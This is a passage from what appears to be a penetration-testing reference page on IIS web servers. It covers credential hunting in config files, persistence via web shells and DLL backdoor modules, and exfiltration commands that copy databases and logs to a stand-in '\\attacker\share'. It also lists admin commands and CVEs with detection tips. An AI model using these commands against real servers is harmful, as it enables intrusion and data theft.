</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="nb">Select-String</span> <span class="n">-Path</span> <span class="s2">&quot;C:\inetpub\wwwroot\*.config&quot;</span> <span class="n">-Pattern</span> <span class="s2">&quot;connectionString&quot;</span> <span class="n">-Recurse</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="c"># Search for passwords</span>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="nb">Select-String</span> <span class="n">-Path</span> <span class="s2">&quot;C:\inetpub\wwwroot\*&quot;</span> <span class="n">-Pattern</span> <span class="s2">&quot;password&quot;</span> <span class="n">-Recurse</span>
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
</span><span id="__span-20-7"><a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="c"># Decrypt encrypted sections (if you have permissions)</span>
</span><span id="__span-20-8"><a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="n">aspnet_regiis</span><span class="p">.</span><span class="n">exe</span> <span class="n">-pdf</span> <span class="s2">&quot;connectionStrings&quot;</span> <span class="s2">&quot;C:\inetpub\wwwroot\myapp&quot;</span>
</span><span id="__span-20-9"><a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
</span><span id="__span-20-10"><a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="c"># Export IIS configuration</span>
</span><span id="__span-20-11"><a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">config</span> <span class="p">/</span><span class="n">text</span>
</span><span id="__span-20-12"><a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>
</span><span id="__span-20-13"><a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="c"># List application pools and identities</span>
</span><span id="__span-20-14"><a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">apppool</span> <span class="p">/</span><span class="n">text</span>
</span></code></pre></div></p>
<p><strong>Persistence mechanisms:</strong></p>
<ul>
<li>Deploy ASP.NET web shell in hidden directory</li>
<li>Register malicious IIS module (DLL backdoor)</li>
<li>Modify Global.asax for application-level persistence</li>
<li>Add scheduled task via ASP.NET code execution</li>
<li>Create new application pool with elevated identity</li>
<li>Modify applicationHost.config to load malicious module</li>
<li>Plant backdoor in App_Code (automatically compiled)</li>
</ul>
<p><strong>IIS module persistence (advanced):</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="c"># Malicious IIS modules survive patches and reboots</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="c"># Common in APT campaigns (e.g., SharePoint exploits)</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="c"># List loaded modules</span>
</span><span id="__span-21-5"><a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">module</span>
</span><span id="__span-21-6"><a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>
</span><span id="__span-21-7"><a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a><span class="c"># Check for suspicious DLLs in</span>
</span><span id="__span-21-8"><a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a><span class="k">%</span><span class="n">SystemRoot</span><span class="p">%\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span>
</span><span id="__span-21-9"><a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>
</span><span id="__span-21-10"><a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a><span class="c"># Monitor Event ID 29 and 50 for module loading</span>
</span><span id="__span-21-11"><a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a><span class="nb">Get-WinEvent</span> <span class="n">-FilterHashtable</span> <span class="p">@{</span><span class="n">LogName</span><span class="p">=</span><span class="s1">&#39;System&#39;</span><span class="p">;</span><span class="n">ID</span><span class="p">=</span><span class="n">29</span><span class="p">,</span><span class="n">50</span><span class="p">}</span>
</span></code></pre></div></p>
<p><strong>Lateral movement:</strong></p>
<ul>
<li>Extract AD credentials from IIS application pools</li>
<li>Access backend databases with connection string credentials</li>
<li>Pivot to internal network from DMZ web server</li>
<li>Access file shares mapped in web applications</li>
<li>Compromise linked Exchange/SharePoint servers</li>
</ul>
<p><strong>Data exfiltration:</strong>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="c"># Access App_Data databases</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="nb">copy </span><span class="s2">&quot;C:\inetpub\wwwroot\App_Data\database.mdf&quot;</span> <span class="p">\\</span><span class="n">attacker</span><span class="p">\</span><span class="n">share</span><span class="p">\</span>
</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="c"># Dump IIS logs for reconnaissance</span>
</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="nb">copy </span><span class="s2">&quot;C:\inetpub\logs\LogFiles\W3SVC1\*&quot;</span> <span class="p">\\</span><span class="n">attacker</span><span class="p">\</span><span class="n">share</span><span class="p">\</span>
</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="c"># Extract SSL certificates and keys</span>
</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="c"># Use Mimikatz or export from certificate store</span>
</span></code></pre></div></p>
</div>
<hr />
<h2 id="useful-commands">Useful Commands<a class="headerlink" href="#useful-commands" title="Permanent link">&para;</a></h2>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c"># Check if IIS is installed and running</span>
</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">W3SVC</span>
</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nb">Get-WindowsFeature</span> <span class="n">-Name</span> <span class="n">Web-Server</span>
</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>
</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="c"># IIS Manager GUI</span>
</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">inetmgr</span>
</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>
</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="c"># List all sites</span>
</span><span id="__span-23-9"><a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">site</span>
</span><span id="__span-23-10"><a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>
</span><span id="__span-23-11"><a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a><span class="c"># List application pools</span>
</span><span id="__span-23-12"><a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">apppool</span>
</span><span id="__span-23-13"><a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>
</span><span id="__span-23-14"><a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a><span class="c"># List all configurations</span>
</span><span id="__span-23-15"><a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">config</span>
</span><span id="__span-23-16"><a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>
</span><span id="__span-23-17"><a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a><span class="c"># Show full configuration in XML</span>
</span><span id="__span-23-18"><a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">config</span> <span class="p">/</span><span class="n">text</span>
</span><span id="__span-23-19"><a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>
</span><span id="__span-23-20"><a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a><span class="c"># Get specific site configuration</span>
</span><span id="__span-23-21"><a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">site</span> <span class="s2">&quot;Default Web Site&quot;</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">xml</span>
</span><span id="__span-23-22"><a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>
</span><span id="__span-23-23"><a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a><span class="c"># Start/Stop/Restart IIS</span>
</span><span id="__span-23-24"><a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a><span class="n">iisreset</span> <span class="p">/</span><span class="nb">start</span>
</span><span id="__span-23-25"><a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a><span class="n">iisreset</span> <span class="p">/</span><span class="n">stop</span>
</span><span id="__span-23-26"><a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a><span class="n">iisreset</span> <span class="p">/</span><span class="n">restart</span>
</span><span id="__span-23-27"><a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>
</span><span id="__span-23-28"><a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a><span class="c"># Stop specific site</span>
</span><span id="__span-23-29"><a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">stop</span> <span class="n">site</span> <span class="s2">&quot;Default Web Site&quot;</span>
</span><span id="__span-23-30"><a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a>
</span><span id="__span-23-31"><a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a><span class="c"># Start specific site</span>
</span><span id="__span-23-32"><a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="nb">start </span><span class="n">site</span> <span class="s2">&quot;Default Web Site&quot;</span>
</span><span id="__span-23-33"><a id="__codelineno-23-33" name="__codelineno-23-33" href="#__codelineno-23-33"></a>
</span><span id="__span-23-34"><a id="__codelineno-23-34" name="__codelineno-23-34" href="#__codelineno-23-34"></a><span class="c"># Recycle application pool</span>
</span><span id="__span-23-35"><a id="__codelineno-23-35" name="__codelineno-23-35" href="#__codelineno-23-35"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">recycle</span> <span class="n">apppool</span> <span class="s2">&quot;DefaultAppPool&quot;</span>
</span><span id="__span-23-36"><a id="__codelineno-23-36" name="__codelineno-23-36" href="#__codelineno-23-36"></a>
</span><span id="__span-23-37"><a id="__codelineno-23-37" name="__codelineno-23-37" href="#__codelineno-23-37"></a><span class="c"># Backup IIS configuration</span>
</span><span id="__span-23-38"><a id="__codelineno-23-38" name="__codelineno-23-38" href="#__codelineno-23-38"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">add</span> <span class="n">backup</span> <span class="s2">&quot;BackupName&quot;</span>
</span><span id="__span-23-39"><a id="__codelineno-23-39" name="__codelineno-23-39" href="#__codelineno-23-39"></a>
</span><span id="__span-23-40"><a id="__codelineno-23-40" name="__codelineno-23-40" href="#__codelineno-23-40"></a><span class="c"># Restore IIS configuration</span>
</span><span id="__span-23-41"><a id="__codelineno-23-41" name="__codelineno-23-41" href="#__codelineno-23-41"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">restore</span> <span class="n">backup</span> <span class="s2">&quot;BackupName&quot;</span>
</span><span id="__span-23-42"><a id="__codelineno-23-42" name="__codelineno-23-42" href="#__codelineno-23-42"></a>
</span><span id="__span-23-43"><a id="__codelineno-23-43" name="__codelineno-23-43" href="#__codelineno-23-43"></a><span class="c"># List all backups</span>
</span><span id="__span-23-44"><a id="__codelineno-23-44" name="__codelineno-23-44" href="#__codelineno-23-44"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">backup</span>
</span><span id="__span-23-45"><a id="__codelineno-23-45" name="__codelineno-23-45" href="#__codelineno-23-45"></a>
</span><span id="__span-23-46"><a id="__codelineno-23-46" name="__codelineno-23-46" href="#__codelineno-23-46"></a><span class="c"># Find configuration files</span>
</span><span id="__span-23-47"><a id="__codelineno-23-47" name="__codelineno-23-47" href="#__codelineno-23-47"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">b</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">config</span><span class="p">\*.</span><span class="n">config</span>
</span><span id="__span-23-48"><a id="__codelineno-23-48" name="__codelineno-23-48" href="#__codelineno-23-48"></a><span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="p">/</span><span class="n">b</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\*.</span><span class="n">config</span>
</span><span id="__span-23-49"><a id="__codelineno-23-49" name="__codelineno-23-49" href="#__codelineno-23-49"></a>
</span><span id="__span-23-50"><a id="__codelineno-23-50" name="__codelineno-23-50" href="#__codelineno-23-50"></a><span class="c"># Search for passwords in configs</span>
</span><span id="__span-23-51"><a id="__codelineno-23-51" name="__codelineno-23-51" href="#__codelineno-23-51"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="s2">&quot;password&quot;</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\*.</span><span class="n">config</span>
</span><span id="__span-23-52"><a id="__codelineno-23-52" name="__codelineno-23-52" href="#__codelineno-23-52"></a><span class="n">findstr</span> <span class="p">/</span><span class="nb">si </span><span class="s2">&quot;connectionString&quot;</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">wwwroot</span><span class="p">\*.</span><span class="n">config</span>
</span><span id="__span-23-53"><a id="__codelineno-23-53" name="__codelineno-23-53" href="#__codelineno-23-53"></a>
</span><span id="__span-23-54"><a id="__codelineno-23-54" name="__codelineno-23-54" href="#__codelineno-23-54"></a><span class="c"># PowerShell: Search for credentials</span>
</span><span id="__span-23-55"><a id="__codelineno-23-55" name="__codelineno-23-55" href="#__codelineno-23-55"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span> <span class="n">-Recurse</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">config</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="s2">&quot;password|connectionString&quot;</span>
</span><span id="__span-23-56"><a id="__codelineno-23-56" name="__codelineno-23-56" href="#__codelineno-23-56"></a>
</span><span id="__span-23-57"><a id="__codelineno-23-57" name="__codelineno-23-57" href="#__codelineno-23-57"></a><span class="c"># View IIS logs</span>
</span><span id="__span-23-58"><a id="__codelineno-23-58" name="__codelineno-23-58" href="#__codelineno-23-58"></a><span class="nb">Get-Content</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">W3SVC1</span><span class="p">\*.</span><span class="n">log</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-Last</span> <span class="n">100</span>
</span><span id="__span-23-59"><a id="__codelineno-23-59" name="__codelineno-23-59" href="#__codelineno-23-59"></a>
</span><span id="__span-23-60"><a id="__codelineno-23-60" name="__codelineno-23-60" href="#__codelineno-23-60"></a><span class="c"># Monitor IIS logs in real-time (PowerShell)</span>
</span><span id="__span-23-61"><a id="__codelineno-23-61" name="__codelineno-23-61" href="#__codelineno-23-61"></a><span class="nb">Get-Content</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">LogFiles</span><span class="p">\</span><span class="n">W3SVC1</span><span class="p">\</span><span class="n">u_ex</span><span class="p">*.</span><span class="n">log</span> <span class="n">-Wait</span> <span class="n">-Tail</span> <span class="n">50</span>
</span><span id="__span-23-62"><a id="__codelineno-23-62" name="__codelineno-23-62" href="#__codelineno-23-62"></a>
</span><span id="__span-23-63"><a id="__codelineno-23-63" name="__codelineno-23-63" href="#__codelineno-23-63"></a><span class="c"># Check IIS version</span>
</span><span id="__span-23-64"><a id="__codelineno-23-64" name="__codelineno-23-64" href="#__codelineno-23-64"></a><span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\InetStp&quot;</span> <span class="p">/</span><span class="n">v</span> <span class="n">VersionString</span>
</span><span id="__span-23-65"><a id="__codelineno-23-65" name="__codelineno-23-65" href="#__codelineno-23-65"></a>
</span><span id="__span-23-66"><a id="__codelineno-23-66" name="__codelineno-23-66" href="#__codelineno-23-66"></a><span class="c"># List installed IIS modules</span>
</span><span id="__span-23-67"><a id="__codelineno-23-67" name="__codelineno-23-67" href="#__codelineno-23-67"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">module</span>
</span><span id="__span-23-68"><a id="__codelineno-23-68" name="__codelineno-23-68" href="#__codelineno-23-68"></a>
</span><span id="__span-23-69"><a id="__codelineno-23-69" name="__codelineno-23-69" href="#__codelineno-23-69"></a><span class="c"># Export site configuration</span>
</span><span id="__span-23-70"><a id="__codelineno-23-70" name="__codelineno-23-70" href="#__codelineno-23-70"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">site</span> <span class="s2">&quot;Default Web Site&quot;</span> <span class="p">/</span><span class="n">config</span> <span class="p">/</span><span class="n">xml</span> <span class="p">&gt;</span> <span class="n">site_config</span><span class="p">.</span><span class="n">xml</span>
</span><span id="__span-23-71"><a id="__codelineno-23-71" name="__codelineno-23-71" href="#__codelineno-23-71"></a>
</span><span id="__span-23-72"><a id="__codelineno-23-72" name="__codelineno-23-72" href="#__codelineno-23-72"></a><span class="c"># Check application pool identity</span>
</span><span id="__span-23-73"><a id="__codelineno-23-73" name="__codelineno-23-73" href="#__codelineno-23-73"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">apppool</span> <span class="s2">&quot;DefaultAppPool&quot;</span> <span class="p">/</span><span class="n">text</span><span class="p">:</span><span class="n">processModel</span><span class="p">.</span><span class="n">identityType</span>
</span><span id="__span-23-74"><a id="__codelineno-23-74" name="__codelineno-23-74" href="#__codelineno-23-74"></a>
</span><span id="__span-23-75"><a id="__codelineno-23-75" name="__codelineno-23-75" href="#__codelineno-23-75"></a><span class="c"># List virtual directories</span>
</span><span id="__span-23-76"><a id="__codelineno-23-76" name="__codelineno-23-76" href="#__codelineno-23-76"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">vdir</span>
</span><span id="__span-23-77"><a id="__codelineno-23-77" name="__codelineno-23-77" href="#__codelineno-23-77"></a>
</span><span id="__span-23-78"><a id="__codelineno-23-78" name="__codelineno-23-78" href="#__codelineno-23-78"></a><span class="c"># Check bindings</span>
</span><span id="__span-23-79"><a id="__codelineno-23-79" name="__codelineno-23-79" href="#__codelineno-23-79"></a><span class="k">%</span><span class="n">systemroot</span><span class="p">%\</span><span class="n">system32</span><span class="p">\</span><span class="n">inetsrv</span><span class="p">\</span><span class="n">appcmd</span><span class="p">.</span><span class="n">exe</span> <span class="n">list</span> <span class="n">site</span> <span class="p">/</span><span class="n">text</span><span class="p">:</span><span class="n">bindings</span>
</span><span id="__span-23-80"><a id="__codelineno-23-80" name="__codelineno-23-80" href="#__codelineno-23-80"></a>
</span><span id="__span-23-81"><a id="__codelineno-23-81" name="__codelineno-23-81" href="#__codelineno-23-81"></a><span class="c"># View failed request tracing logs</span>
</span><span id="__span-23-82"><a id="__codelineno-23-82" name="__codelineno-23-82" href="#__codelineno-23-82"></a><span class="n">notepad</span> <span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">logs</span><span class="p">\</span><span class="n">FailedReqLogFiles</span><span class="p">\</span><span class="n">W3SVC1</span><span class="p">\*.</span><span class="n">xml</span>
</span><span id="__span-23-83"><a id="__codelineno-23-83" name="__codelineno-23-83" href="#__codelineno-23-83"></a>
</span><span id="__span-23-84"><a id="__codelineno-23-84" name="__codelineno-23-84" href="#__codelineno-23-84"></a><span class="c"># PowerShell: Get IIS site information</span>
</span><span id="__span-23-85"><a id="__codelineno-23-85" name="__codelineno-23-85" href="#__codelineno-23-85"></a><span class="nb">Import-Module</span> <span class="n">WebAdministration</span>
</span><span id="__span-23-86"><a id="__codelineno-23-86" name="__codelineno-23-86" href="#__codelineno-23-86"></a><span class="nb">Get-Website</span>
</span><span id="__span-23-87"><a id="__codelineno-23-87" name="__codelineno-23-87" href="#__codelineno-23-87"></a><span class="nb">Get-IISSite</span>
</span><span id="__span-23-88"><a id="__codelineno-23-88" name="__codelineno-23-88" href="#__codelineno-23-88"></a><span class="nb">Get-WebBinding</span>
</span></code></pre></div>
<hr />
<h2 id="known-vulnerabilities">Known Vulnerabilities<a class="headerlink" href="#known-vulnerabilities" title="Permanent link">&para;</a></h2>
<details class="danger">
<summary>CVE-2025-59282 - IIS Remote Code Execution via COM Objects Race Condition</summary>
<p>Remote code execution vulnerability in IIS Inbox COM Objects due to race condition and use-after-free in global memory handling.</p>
<p><strong>Affected versions:</strong> IIS on Windows Server 2016, 2019, 2022, Windows 10/11<br />
<strong>Severity:</strong> Important (CVSS 7.0)<br />
<strong>Fixed in:</strong> October 2025 security update<br />
<strong>Attack vector:</strong> Local (requires user interaction with malicious file)
<strong>Impact:</strong> Arbitrary code execution with elevated privileges</p>
<p><strong>Technical details:</strong>
- Race condition (CWE-362) in concurrent thread execution
- Use-after-free (CWE-416) vulnerability in shared memory
- Requires winning timing race for exploitation
- High complexity, user interaction required</p>
</details>
<details class="danger">
<summary>CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706 - SharePoint RCE with IIS Module Persistence</summary>
<p>Critical SharePoint vulnerabilities being actively exploited with IIS module persistence for long-term access.</p>
<p><strong>Affected versions:</strong> SharePoint Server 2019, 2016, 2013<br />
<strong>Severity:</strong> Critical (CVSS 9.8)<br />
<strong>First seen:</strong> July 2025<br />
<strong>Impact:</strong> Remote code execution, persistent access via malicious IIS modules</p>
<p><strong>Attack chain:</strong>
1. Exploit SharePoint vulnerability for unauthenticated RCE
2. Deploy spinstall0.aspx webshell for immediate control
3. Steal machine keys and gather credentials
4. Install malicious IIS modules (DLL backdoors) for persistence
5. Modules survive patches, reboots, and traditional security scans</p>
<p><strong>Detection:</strong>
- Monitor Event IDs 29 and 50 for module loading
- Check for unusual w3wp.exe process behavior
- Review IIS module list for unauthorized DLLs
- Monitor for webshell patterns (spinstall0.aspx)</p>
</details>
<details class="danger">
<summary>CVE-2023-38180 - HTTP/2 Rapid Reset DoS</summary>
<p>Denial of Service vulnerability in HTTP/2 implementation allowing resource exhaustion.</p>
<p><strong>Affected versions:</strong> IIS 10.0 on Windows Server 2016+<br />
<strong>Severity:</strong> High (CVSS 7.5)<br />
<strong>Fixed in:</strong> October 2023 security update<br />
<strong>Impact:</strong> Service disruption via rapid stream creation and cancellation</p>
<p><strong>Exploitation:</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># Rapid RST_STREAM attack</span>
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="c1"># Creates and cancels HTTP/2 streams rapidly</span>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="c1"># Exhausts server resources</span>
</span></code></pre></div></p>
</details>
<details class="danger">
<summary>CVE-2023-28796, CVE-2023-28799, CVE-2023-28800 - Multiple HTTP.sys DoS Vulnerabilities</summary>
<p>Multiple denial of service vulnerabilities in HTTP.sys driver.</p>
<p><strong>Affected versions:</strong> Windows Server 2022, 2019, 2016, Windows 10/11<br />
<strong>Severity:</strong> Medium<br />
<strong>Fixed in:</strong> July 2023 security update<br />
<strong>Impact:</strong> System crash or unresponsiveness</p>
</details>
<details class="danger">
<summary>CVE-2022-21907 - HTTP.sys Remote Code Execution</summary>
<p>Remote code execution vulnerability in HTTP Protocol Stack (HTTP.sys).</p>
<p><strong>Affected versions:</strong> Windows Server 2019, 2022, Windows 10, 11<br />
<strong>Severity:</strong> Critical (CVSS 9.8)<br />
<strong>Fixed in:</strong> January 2022 security update<br />
<strong>Impact:</strong> Remote code execution, denial of service</p>
<p><strong>Exploitation:</strong>
